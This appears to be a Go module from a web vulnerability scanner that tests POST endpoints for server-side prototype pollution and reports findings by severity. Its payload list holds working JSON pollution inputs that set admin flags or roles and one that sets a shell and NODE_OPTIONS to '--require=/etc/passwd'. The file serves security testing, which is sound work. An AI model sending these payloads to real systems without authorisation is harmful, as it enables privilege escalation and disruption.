package modules

import (
	"bytes"
	"fmt"
	"github.com/SentinelXofficial/sxel/internal/output"
	"github.com/SentinelXofficial/sxel/pkg/core"
	"net/http"
	"strings"
	"time"
)

type protoPollutionTest struct {
	Label    string
	JSONBody string
	Marker   string
}

var protoPollutionPayloads = []protoPollutionTest{
	{
		Label:    "__proto__ pollution — isAdmin",
		JSONBody: `{"__proto__":{"isAdmin":true}}`,
		Marker:   "isAdmin",
	},
	{
		Label:    "__proto__ pollution — role",
		JSONBody: `{"__proto__":{"role":"admin"}}`,
		Marker:   "role",
	},
	{
		Label:    "constructor.prototype pollution",
		JSONBody: `{"constructor":{"prototype":{"isAdmin":true}}}`,
		Marker:   "isAdmin",
	},
	{
		Label:    "__proto__ pollution — shell",
		JSONBody: `{"__proto__":{"shell":"node","env":{"NODE_OPTIONS":"--require=/etc/passwd"}}}`,
		Marker:   "shell",
	},
	{
		Label:    "Nested __proto__ in array",
		JSONBody: `{"items":[{"__proto__":{"admin":true}}]}`,
		Marker:   "admin",
	},
	{
		Label:    "Pollution via toString",
		JSONBody: `{"__proto__":{"toString":"polluted"}}`,
		Marker:   "toString",
	},
	{
		Label:    "Pollution via valueOf",
		JSONBody: `{"__proto__":{"valueOf":"polluted"}}`,
		Marker:   "valueOf",
	},
	{
		Label:    "__proto__ with nested object",
		JSONBody: `{"user":{"__proto__":{"role":"admin"}},"name":"test"}`,
		Marker:   "role",
	},
	{
		Label:    "JSON.parse bypass via constructor",
		JSONBody: `{"constructor":{"prototype":{"polluted":true}},"normalKey":"value"}`,
		Marker:   "polluted",
	},
}

func ScanProtoPollution(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	postEndpoints := map[string]bool{target.URL: true}
	for _, form := range target.Forms {
		if strings.ToUpper(form.Method) == "POST" && form.Action != "" {
			postEndpoints[form.Action] = true
		}
	}

	for endpoint := range postEndpoints {
		if cfg.Verbose {
			output.Verbose("[proto-pollution] probing %s", endpoint)
		}

		baselineBody, baselineStatus, err := doJSONPostRaw(client, cfg, endpoint, `{"test":"sxel_normal_baseline"}`)
		if err != nil || baselineStatus == 404 || baselineStatus == 405 || baselineStatus == 415 {
			continue
		}
		ctrlBody, _, err := doJSONPostRaw(client, cfg, endpoint, `{"sxel_echo_probe_7f3a":true}`)
		echoEndpoint := err == nil && strings.Contains(strings.ToLower(ctrlBody), "sxel_echo_probe_7f3a")

		for _, pl := range protoPollutionPayloads {
			body, status, err := doJSONPostRaw(client, cfg, endpoint, pl.JSONBody)
			if err != nil {
				continue
			}

			bodyLow := strings.ToLower(body)
			baselineLow := strings.ToLower(baselineBody)

			errorMarkers := []string{
				"cannot read properties", "undefined is not",
				"typeerror", "unexpected token",
				"is not a function", "cannot set property",
			}
			reportedHigh := false
			for _, marker := range errorMarkers {
				if strings.Contains(bodyLow, marker) && !strings.Contains(baselineLow, marker) {
					ev := fmt.Sprintf("marker %q leaked in response (HTTP %d)", marker, status)
					results = append(results, core.ScanResult{
						Type:      "Prototype Pollution — Server-Side Reflection",
						URL:       endpoint,
						Method:    "POST",
						Parameter: "body",
						Payload:   pl.Label,
						Severity:  "HIGH",
						Evidence:  ev,
						Timestamp: time.Now(),
					})
					reportedHigh = true
					break
				}
			}

			if reportedHigh {
				continue
			}

			if !echoEndpoint {
				marker := strings.ToLower(pl.Marker)
				markerReflected := marker != "" &&
					strings.Contains(bodyLow, marker) && !strings.Contains(baselineLow, marker)
				protoEchoed := (!strings.Contains(baselineLow, "__proto__") && strings.Contains(bodyLow, "__proto__")) ||
					(!strings.Contains(baselineLow, "constructor") && strings.Contains(bodyLow, "constructor"))
				if (markerReflected || protoEchoed) && !containsProtoResult(results, endpoint, pl.Label) {
					results = append(results, core.ScanResult{
						Type:      "Prototype Pollution — Response Reflection",
						URL:       endpoint,
						Method:    "POST",
						Parameter: "body",
						Payload:   pl.Label,
						Severity:  "MEDIUM",
						Evidence:  fmt.Sprintf("pollution marker %q reflected in response (HTTP %d) and absent from baseline", pl.Marker, status),
						Timestamp: time.Now(),
					})
				}
			}
		}
	}

	return results
}

func doJSONPostRaw(client *http.Client, cfg *core.Config, rawURL, jsonBody string) (string, int, error) {
	req, err := http.NewRequest("POST", rawURL, bytes.NewBufferString(jsonBody))
	if err != nil {
		return "", 0, err
	}
	core.ApplyHeaders(req, cfg)
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return "", 0, err
	}
	defer resp.Body.Close()
	b := core.ReadBody(resp.Body)
	return b, resp.StatusCode, nil
}

func containsProtoResult(results []core.ScanResult, endpoint, label string) bool {
	for _, r := range results {
		if r.URL == endpoint && strings.Contains(r.Payload, label) {
			return true
		}
	}
	return false
}
